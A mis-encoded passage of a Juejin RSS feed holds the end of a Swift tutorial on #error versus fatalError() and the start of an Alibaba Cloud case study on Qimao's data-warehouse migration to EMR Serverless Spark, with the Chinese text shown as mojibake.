}
â€‹
<span class="hljs-comment">// æ£€æŸ¥é…ç½®</span>
<span class="hljs-built_in">enum</span> Environment {
 Â   <span class="hljs-keyword">case</span> development, production
 Â  Â 
 Â   <span class="hljs-keyword">static</span> <span class="hljs-keyword">var</span> current: Environment {
 Â  Â  Â   <span class="hljs-meta">#<span class="hljs-keyword">error</span>("è¯·è®¾ç½®ç¯å¢ƒå˜é‡")</span>
 Â  Â  Â   <span class="hljs-keyword">return</span> .development
 Â   }
}
<span class="hljs-comment">// ç‰ˆæœ¬æ£€æŸ¥</span>
<span class="hljs-meta">#<span class="hljs-keyword">if</span> swift(&lt;5.0)</span>
 Â   <span class="hljs-meta">#<span class="hljs-keyword">error</span>("æ­¤é¡¹ç›®éœ€è¦ Swift 5.0 æˆ–æ›´é«˜ç‰ˆæœ¬")</span>
<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
â€‹
<span class="hljs-comment">// æ¡†æ¶å¼€å‘ä¸­æ ‡è®°æœªå®ç°åŠŸèƒ½</span>
<span class="hljs-keyword">class</span> <span class="hljs-title">MyFramework</span> {
 Â   <span class="hljs-function">func <span class="hljs-title">requiredMethod</span>()</span> {
 Â  Â  Â   <span class="hljs-comment">// æ ‡è®°ä¸ºå¿…é¡»å®ç°çš„æ–¹æ³•</span>
 Â  Â  Â   <span class="hljs-meta">#<span class="hljs-keyword">error</span>("å­ç±»å¿…é¡»é‡å†™æ­¤æ–¹æ³•")</span>
 Â   }
}
â€‹
<span class="hljs-keyword">class</span> <span class="hljs-title">CustomImplementation</span>: <span class="hljs-title">MyFramework</span> {
 Â   <span class="hljs-function"><span class="hljs-keyword">override</span> func <span class="hljs-title">requiredMethod</span>()</span> {
 Â  Â  Â   <span class="hljs-comment">// å¦‚æœä¸å®ç°ï¼Œç¼–è¯‘ä¼šæŠ¥é”™</span>
 Â  Â  Â   print(<span class="hljs-string">"å®ç°è‡ªå®šä¹‰é€»è¾‘"</span>)
 Â   }
}
</code></pre>
<p>#errorä¸ fatalError()è¿™ä¸¤ä¸ªéƒ½æ˜¯ç”¨äºå¼ºåˆ¶åœæ­¢ç¨‹åºæ‰§è¡Œï¼Œä½†å·¥ä½œåœ¨ä¸åŒçš„é˜¶æ®µï¼Œæœ‰ç€æœ¬è´¨åŒºåˆ«ï¼š</p>
<h2 data-id="heading-6">æ ¸å¿ƒåŒºåˆ«æ€»ç»“</h2>













































<table><thead><tr><th>ç‰¹æ€§</th><th><code>#error</code></th><th><code>fatalError()</code></th></tr></thead><tbody><tr><td><strong>æ‰§è¡Œé˜¶æ®µ</strong></td><td>ç¼–è¯‘æ—¶</td><td>è¿è¡Œæ—¶</td></tr><tr><td><strong>ä½ç½®</strong></td><td>ä»£ç ä¸­ä»»ä½•åœ°æ–¹</td><td>åªèƒ½åœ¨å‡½æ•°/æ–¹æ³•ä½“å†…</td></tr><tr><td><strong>å¯æ‰§è¡Œä»£ç </strong></td><td>ä¸èƒ½åŒ…å«</td><td>å¯ä»¥åŒ…å«å…¶ä»–ä»£ç </td></tr><tr><td><strong>æ¡ä»¶æ£€æŸ¥</strong></td><td>ç¼–è¯‘æ—¶æ¡ä»¶ï¼ˆ<code>#if</code>ï¼‰</td><td>è¿è¡Œæ—¶æ¡ä»¶ï¼ˆ<code>if</code>, <code>guard</code>ï¼‰</td></tr><tr><td><strong>é”™è¯¯ç±»å‹</strong></td><td>ç¼–è¯‘é”™è¯¯</td><td>è¿è¡Œæ—¶é”™è¯¯</td></tr><tr><td><strong>å¯æ•è·</strong></td><td>å¦</td><td>å¦ï¼ˆä½†å¯ä»¥è®¾ç½®é”™è¯¯å¤„ç†ï¼‰</td></tr><tr><td><strong>ä¿¡æ¯æ˜¾ç¤º</strong></td><td>ç¼–è¯‘é”™è¯¯ä¿¡æ¯</td><td>è¿è¡Œæ—¶å´©æºƒä¿¡æ¯</td></tr></tbody></table>
<h3 data-id="heading-7">7ã€dumpå’Œprintçš„åŒºåˆ«</h3>
<ul>
<li><strong>printï¼š</strong> ç”¨äºè¾“å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå€¼åˆ°æ§åˆ¶å°ï¼Œé€‚åˆç”¨äºç®€å•çš„è°ƒè¯•å’Œæ—¥å¿—è®°å½•ã€‚printå‡½æ•°ä¼šæ·»åŠ æ¢è¡Œç¬¦</li>
<li><strong>dumpï¼š</strong> ä¸»è¦ç”¨äºè¾“å‡ºå¯¹è±¡çš„å†…éƒ¨ç»“æ„ï¼ŒåŒ…å«å…¶å±æ€§ï¼ˆåŒ…æ‹¬ç§æœ‰å±æ€§ï¼‰ä»¥åŠåµŒå¥—å¯¹è±¡çš„ç»“æ„ã€‚å®ƒä¼šé€’å½’åœ°è¾“å‡ºä¸€ä¸ªå¯¹è±¡çš„é•œåƒï¼Œæ˜¾ç¤ºæ‰€æœ‰å­æˆå‘˜ã€‚é€šå¸¸ç”¨äºè°ƒè¯•å¤æ‚çš„å¯¹è±¡ï¼Œæ¯”å¦‚æ•°ç»„ã€å­—å…¸ã€è‡ªå®šä¹‰å®ä¾‹ç¯</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Fusion å¼•æ“èµ‹èƒ½ï¼šä¸ƒçŒ«å¦‚ä½•ä½¿ç”¨é˜¿é‡Œäº‘ EMR Serverless Spark å®ç°æ•°ä»“åŠ é€Ÿ]]></title>    <link>https://juejin.cn/post/7582358932027719695</link>    <guid>https://juejin.cn/post/7582358932027719695</guid>    <pubDate>2025-12-11T08:30:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582358932027719695" data-draft-id="7581814484066566196" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Fusion å¼•æ“èµ‹èƒ½ï¼šä¸ƒçŒ«å¦‚ä½•ä½¿ç”¨é˜¿é‡Œäº‘ EMR Serverless Spark å®ç°æ•°ä»“åŠ é€Ÿ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-11T08:30:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿é‡Œäº‘å¤§æ•°æ®AIæŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/2414974667341287"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Fusion å¼•æ“èµ‹èƒ½ï¼šä¸ƒçŒ«å¦‚ä½•ä½¿ç”¨é˜¿é‡Œäº‘ EMR Serverless Spark å®ç°æ•°ä»“åŠ é€Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2414974667341287/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œäº‘å¤§æ•°æ®AIæŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T08:30:53.000Z" title="Thu Dec 11 2025 08:30:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€èƒŒæ™¯ä»‹ç»</h2>
<p><strong>ä¸ƒçŒ«å…¬å¸ä»‹ç»åŠä¸šåŠ¡è§„æ¨¡</strong></p>
<ul>
<li>ä¸ƒçŒ«æ˜¯ä¸€å®¶æ·±è€•æ–‡åŒ–å¨±ä¹è¡Œä¸šçš„äº’è”ç½‘ä¼ä¸šï¼Œæ€»éƒ¨åè½åœ¨ä¸Šæµ·å¸‚å‰æ»©ä¸­å¿ƒã€‚ä¸ƒçŒ«æ——ä¸‹åŸåˆ›æ–‡å­¦ç½‘ç«™ä¸ƒçŒ«ä¸­æ–‡ç½‘äº2017å¹´5æœˆæ­£å¼ä¸Šçº¿ï¼Œä¸“æ³¨ä¸ºåŸåˆ›ä½œè€…æä¾›åˆ›ä½œæŒ‡å¯¼ã€ç‰ˆæƒè¿è¥ç­‰å…¨æ–¹ä½ä¸€ä½“åŒ–æœåŠ¡ã€‚ä¸ƒçŒ«æ‹³å¤´äº§å“ä¸ƒçŒ«å…è´¹å°è¯´Â AppÂ äº2018å¹´8æœˆæ­£å¼ä¸Šçº¿ï¼Œä¸“æ³¨ä¸ºç”¨æˆ·æä¾›æ­£ç‰ˆã€å…è´¹ã€ä¼˜è´¨çš„ç½‘ç»œæ–‡å­¦å†…å®¹é˜…è¯»æœåŠ¡ã€‚ç°å¹³å°ç”¨æˆ·è¶…Â 6Â äº¿ï¼Œè§„æ¨¡ä½åˆ—æ•°å­—é˜…è¯»è¡Œä¸šå‰åˆ—ã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3caa40d04b6c4a00b7fa161af1385e88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766046653&amp;x-signature=3zWIIH12vMNybX5%2BtvaX1CaCedM%3D" alt="image.png" loading="lazy"/></li>
</ul>
<p><strong>åŸæœ‰å¤§æ•°æ®æ¶æ„</strong></p>
<ul>
<li>ä¸ƒçŒ«çš„æ•°ä»“å›¢é˜Ÿä¸»è¦æ˜¯æ‰¿æ¥ä¸ƒçŒ«å„æ¡ä¸šåŠ¡çº¿çš„ç¦»çº¿æ•°æ®å¼€å‘ã€å®æ—¶æ•°æ®å¼€å‘ã€æŒ‡æ ‡å»ºè®¾ã€æ•°æ®æ²»ç†ç­‰å·¥ä½œã€‚Â 
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/127692a49612410bb821684e070da2bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766046653&amp;x-signature=dVbjMc%2BF8hZ1s2hxv8GWPqJZdhc%3D" alt="image.png" loading="lazy"/></li>
</ul>
<p><strong>æ¶æ„ç—›ç‚¹åˆ†æ</strong>ï¼ˆå¤šä¸šåŠ¡çº¿å¸¦æ¥å¤æ‚åˆ†æéœ€æ±‚/è®¡ç®—æ€§èƒ½ç“¶é¢ˆ/å¼€å‘è¿ç»´é—¨æ§›é«˜æˆæœ¬å¤§.......ï¼‰</p>
<p>1ã€éœ€æ±‚å¤æ‚ï¼ŒåŒæ—¶æ”¯æŒæ•°ä»“å·¥ç¨‹å¸ˆï¼Œæ•°æ®åˆ†æå¸ˆï¼Œç®—æ³•å·¥ç¨‹å¸ˆç­‰å¤šå²—ä½è®¡ç®—éœ€æ±‚</p>
<p>2ã€è®¡ç®—æˆæœ¬é«˜</p>
<ul>
<li>ä¼ ç»Ÿæ•°ä»“ä»»åŠ¡åœ¨åŠæ‰˜ç®¡é›†ç¾¤ä¸‹åªæ”¯æŒå¼€æºÂ Sparkï¼Œæ— æ³•å……åˆ†åˆ©ç”¨ä¸šç•Œé¢†å…ˆçš„Â NativeÂ åŠ é€Ÿå’ŒRemoteÂ ShuffleÂ ServiceÂ æŠ€æœ¯æå‡æ•´ä½“æ€§èƒ½è¿›è€Œé™æœ¬Â </li>
<li>åŠæ‰˜ç®¡é›†ç¾¤å’ŒÂ adhocÂ é›†ç¾¤ç¼ºä¹çµæ´»çš„å¼¹æ€§èƒ½åŠ›ï¼Œå­˜åœ¨è¾ƒå¤§çš„èµ„æºæµªè´¹</li>
</ul>
<p>3ã€ è¿ç»´å¤æ‚</p>
<ul>
<li>åŠæ‰˜ç®¡é›†ç¾¤åœ¨èµ„æºå±‚éœ€è¦ä¸€å®šäººåŠ›ä»‹å…¥è¿ç»´</li>
<li>SparkÂ å¼•æ“å‡çº§ï¼ŒPythonÂ ç¯å¢ƒç®¡ç†ç­‰å¸¸è§è¿ç»´æ“ä½œå¤æ‚ä¸”æœ‰è¾ƒå¤§ç”Ÿäº§é£é™©</li>
<li>æ— æ³•ç²¾ç¡®è¯„ä¼°å„æ¡ä¸šåŠ¡çº¿ä¹ƒè‡³å•ä½œä¸šæˆæœ¬ï¼Œè¿›è€Œè¿›è¡Œé’ˆå¯¹æ€§ä¼˜åŒ–Â </li>
</ul>
<h2 data-id="heading-1">äºŒã€ä¸ºä»€ä¹ˆé€‰æ‹©é˜¿é‡Œäº‘Â EMRÂ ServerlessÂ Spark</h2>
<h3 data-id="heading-2">ï¼ˆä¸€ï¼‰FusionÂ +Â CelebornÂ èµ‹èƒ½ï¼Œæ‰¹å¤„ç†æ€§èƒ½å…¨é¢æå‡è¶…Â 50%</h3>
<p>åœ¨å¤§æ•°æ®è®¡ç®—åœºæ™¯ä¸­ï¼Œä»»åŠ¡æ€§èƒ½ä¸€ç›´æ˜¯å…³æ³¨çš„æ ¸å¿ƒæŒ‡æ ‡ã€‚ä¸ºè¿›ä¸€æ­¥æå‡è®¡ç®—æ•ˆç‡ï¼ŒServerlessÂ SparkÂ æ¨å‡ºäº†Â FusionÂ åŠ é€Ÿèƒ½åŠ›ï¼Œé€šè¿‡å‘é‡åŒ–SQLåŠ é€ŸæŠ€æœ¯ï¼Œæ˜¾è‘—ç¼©çŸ­ä½œä¸šæ‰§è¡Œæ—¶é—´ã€‚åŒæ—¶ï¼ŒServerlessÂ SparkÂ å†…ç½®äº†ä¼ä¸šçº§Â Celebornï¼Œå¤§å¹…æå‡å¤§Â ShuffleÂ ä½œä¸šçš„ç¨³å®šæ€§å’Œæ€§èƒ½ã€‚ä¸ºéªŒè¯å®é™…æ•ˆæœï¼Œæˆ‘ä»¬é€‰å–äº†ä¸‰ä¸ªå…¸å‹çš„æ‰¹å¤„ç†ä»»åŠ¡ï¼Œå¯¹æ¯”ä¼ ç»ŸÂ YarnÂ ç¯å¢ƒå’ŒÂ ServerlessÂ SparkÂ çš„æ‰§è¡Œæ•ˆç‡ã€‚</p>
<p><strong>ç”¨æˆ·è¡Œä¸ºå¢é‡åˆ†æä»»åŠ¡</strong></p>
<ul>
<li>èµ„æºé…ç½®:Â 500Cï¼Œ1500G</li>
<li>Yarnï¼š32Â åˆ†é’Ÿ</li>
<li>ServerlessÂ Sparkï¼š10Â åˆ†é’Ÿï¼Œæé€ŸÂ 69%</li>
</ul>
<p>CelebornÂ æœ‰æ•ˆå‡å°‘äº†å®½ä¾èµ–é˜¶æ®µçš„ä»»åŠ¡è°ƒåº¦ä¸Â ShuffleÂ å¼€é”€ï¼Œä½¿æ•´ä¸ªè®¡ç®—é“¾è·¯æ›´åŠ é«˜æ•ˆã€‚</p>
<p><strong>ç”¨æˆ·æ—¥å¿—æ˜ç»†å¤„ç†ä»»åŠ¡</strong></p>
<ul>
<li>èµ„æºé…ç½®ï¼š500Cï¼Œ1200G</li>
<li>Yarnï¼š30Â åˆ†é’Ÿ</li>
<li>ServerlessÂ Sparkï¼š14Â åˆ†é’Ÿï¼Œæé€ŸÂ 53%</li>
</ul>
<p>åœ¨å…¸å‹çš„æ—¥å¿—æ¸…æ´—ä¸èšåˆä»»åŠ¡ä¸­ï¼ŒFusionÂ åŠ é€Ÿæ˜¾è‘—æå‡äº†å®½è¡¨Â JoinÂ ä¸èšåˆè®¡ç®—çš„æ‰§è¡Œæ•ˆç‡ã€‚</p>
<p><strong>å†…å®¹èšåˆä¸ç»Ÿè®¡ä»»åŠ¡</strong></p>
<ul>
<li>èµ„æºé…ç½®ï¼š800Cï¼Œ1200GÂ Â Â Â </li>
<li>Yarnï¼š71Â åˆ†é’Ÿ</li>
<li>ServerlessÂ Sparkï¼š38Â åˆ†é’Ÿï¼Œæé€ŸÂ 46%</li>
</ul>
<p>é¢å¯¹é«˜è¾¾Â 11TBÂ çš„Â ShuffleÂ æ•°æ®é‡ï¼ŒServerlessÂ SparkÂ ä¾ç„¶ä¿æŒç¨³å®šçš„æ‰§è¡Œæ€§èƒ½ï¼Œæœ‰æ•ˆé™ä½ä»»åŠ¡æ—¶å»¶ã€‚</p>
<p>æ•´ä½“æ¥çœ‹ï¼ŒServerlessÂ SparkÂ å¯¹è®¡ç®—å¯†é›†å‹å’ŒIOå¯†é›†å‹ä»»åŠ¡éƒ½æœ‰å¤§å¹…ä¼˜åŒ–ï¼Œä¸‰ä¸ªä»»åŠ¡å¹³å‡æé€Ÿè¶…è¿‡Â 56%ï¼Œåœ¨å¤æ‚Â ETLÂ ä¸å¤§è§„æ¨¡æ•°æ®å¤„ç†åœºæ™¯ä¸­å±•ç°å‡ºæ˜¾è‘—ä¼˜åŠ¿ã€‚ç›¸æ¯”ä¼ ç»ŸÂ YarnÂ é›†ç¾¤ï¼ŒServerlessÂ SparkÂ ä¸ä»…å…·å¤‡æ›´å¼ºçš„å¼¹æ€§èƒ½åŠ›å’Œæ›´ä½çš„èµ„æºä½¿ç”¨æˆæœ¬ï¼Œé€šè¿‡Â FusionÂ +Â CelebornÂ çš„ä¼˜åŒ–ï¼Œæ›´æ˜¯å®ç°äº†è®¡ç®—æ•ˆç‡ä¸èµ„æºæ€§ä»·æ¯”çš„åŒé‡æå‡ã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/751a2842de7a4ec98d9430591e0d0224~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766046653&amp;x-signature=M3foEOaDtbQxVE%2BAxoQ6IICUGfw%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-3">ï¼ˆäºŒï¼‰ServerlessÂ æ¨¡å¼çªç ´ç®—åŠ›ç“¶é¢ˆï¼Œå®ç°å¼¹æ€§æ•æ·çš„æ•°æ®å¤„ç†</h4>
<p><strong>ğŸ“ŒÂ é—®é¢˜ï¼šä¼ ç»Ÿæ¶æ„éš¾ä»¥åº”å¯¹ç®—åŠ›æ½®æ±ä¸èµ„æºåˆšæ€§çº¦æŸ</strong></p>
<p>éšç€ä¸ƒçŒ«æ•°æ®ä½œä¸šè§„æ¨¡æŒç»­å¢é•¿ï¼Œå¤§æ•°æ®é›†ç¾¤é•¿æœŸå¤„äºé«˜è´Ÿè½½è¿è¡ŒçŠ¶æ€ã€‚åŸæœ‰æ¶æ„å­˜åœ¨ä¸€äº›é—®é¢˜ï¼šå¦‚ç¼ºä¹çµæ´»çš„å¼¹æ€§èƒ½åŠ›ï¼Œè€Œåœ¨ç™½å¤©åˆå­˜åœ¨èµ„æºæµªè´¹ã€‚Â ä¼ ç»Ÿæ¨¡å¼å·²æ— æ³•æ”¯æ’‘â€œæŒ‰éœ€å“åº”ã€å‡†æ—¶äº¤ä»˜â€çš„ç°ä»£æ•°æ®æœåŠ¡è¦æ±‚ï¼Œå¹¶ä¸”åŸå…ˆåŸºäºå®ä¾‹çº§åˆ«çš„èµ„æºäº¤ä»˜æ–¹å¼ï¼Œåœ¨æ½®æ±æ—¶å­˜åœ¨æµªè´¹ã€‚Â 
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81b9230cc312479e8d2470691117b4cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766046653&amp;x-signature=r8i8dhlKbpauhy8hQzUSPN374Nw%3D" alt="image.png" loading="lazy"/></p>
<p>âœ…Â è§£å†³æ–¹æ¡ˆï¼šå¼•å…¥Â ServerlessÂ å¼¹æ€§ç®—åŠ›ï¼Œæ„å»ºæ™ºèƒ½è°ƒåº¦æ–°èŒƒå¼</p>
<p>ä¸ƒçŒ«å…¨é¢æ‹¥æŠ±äº‘åŸç”Ÿç†å¿µï¼Œé‡‡ç”¨Â ServerlessÂ æ¨¡å¼é‡æ„è®¡ç®—å±‚ï¼Œå®ç°é¢å‘ä¸šåŠ¡è´Ÿè½½çš„åŠ¨æ€èµ„æºä¾›ç»™ã€‚æ ¸å¿ƒä¸¾æªåŒ…æ‹¬ï¼š</p>
<p>å¼•å…¥Â Â ServerlessÂ SparkÂ ï¼ŒåŸºäºÂ OSS-HDFSÂ ç»Ÿä¸€å­˜å‚¨å±‚å®ç°è®¡ç®—ä¸å­˜å‚¨å½»åº•è§£è€¦ï¼Œæ”¯æŒè®¡ç®—èµ„æºç§’çº§å¼¹æ€§ä¼¸ç¼©ï¼›</p>
<p><code>åˆ©ç”¨Â ServerlessÂ SparkÂ æµ·é‡èµ„æºæ± ä¸å®¹å™¨åŒ–è°ƒåº¦èƒ½åŠ›ï¼Œå®ç°Â æœ€å°ç²’åº¦Â 1Â æ ¸Â çš„ç²¾ç»†åŒ–èµ„æºè®¡é‡ï¼ŒæŒ‰å®é™…ä½¿ç”¨é‡è®¡è´¹ï¼Œå½»åº•å‘Šåˆ«èµ„æºé¢„å ï¼›</code></p>
<p>åŸºäºÂ DataworksÂ æä¾›çš„å‹å¥½çš„ç”¨æˆ·äº¤äº’ç•Œé¢ï¼Œå¯ä»¥æäº¤ç®¡ç†Â Streaming/SQL/PySparkÂ ç­‰å¤šç±»ä½œä¸šã€‚Â </p>
<p>é«˜å³°æœŸç®—åŠ›çˆ†å‘èƒ½åŠ›å¤§å¹…æå‡ï¼Œåˆ†é’Ÿå†…å³å¯å¼¹å‡ºæ•°åƒæ ¸Â vCoreÂ èµ„æºï¼Œæ»¡è¶³ç¬æ—¶é«˜å¹¶å‘å¤„ç†éœ€æ±‚ã€‚è¯¥æ¨¡å¼å®ç°äº†ä»â€œèµ„æºé©±åŠ¨è°ƒåº¦â€å‘â€œä¸šåŠ¡éœ€æ±‚é©±åŠ¨æ‰§è¡Œâ€çš„æ ¹æœ¬è½¬å˜ã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5f18603538e4d7f9916f30c307ea90b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766046653&amp;x-signature=hOCWyhsmJv4czrIXryJf4Rq40kc%3D" alt="image.png" loading="lazy"/></p>
<p><strong>ä¸‰ã€æŠ€æœ¯æ–¹æ¡ˆè®¾è®¡</strong>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afafd2c0bb9a4bc2899b8816335b1817~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766046653&amp;x-signature=QlVuiaGMFTrAprNUKxhzvFeN9Dk%3D" alt="image.png" loading="lazy"/></p>
<p><strong>åº”ç”¨å±‚</strong></p>
<ul>
<li>åŸºäºé˜¿é‡Œäº‘Â DataWorksÂ å’Œè‡ªå»ºÂ ApacheÂ DolphinSchedulerÂ è¿›è¡Œæ•°ä»“å¼€å‘ã€‚</li>
<li>åŸºäºÂ JetbrainsÂ IDEÂ äº§å“å’Œè‡ªå»ºÂ ApacheÂ SupersetÂ è¿›è¡ŒæŠ¥è¡¨åˆ†æå’ŒÂ adhocÂ æŸ¥è¯¢ã€‚</li>
</ul>
<p><strong>æ¥å…¥å±‚</strong></p>
<ul>
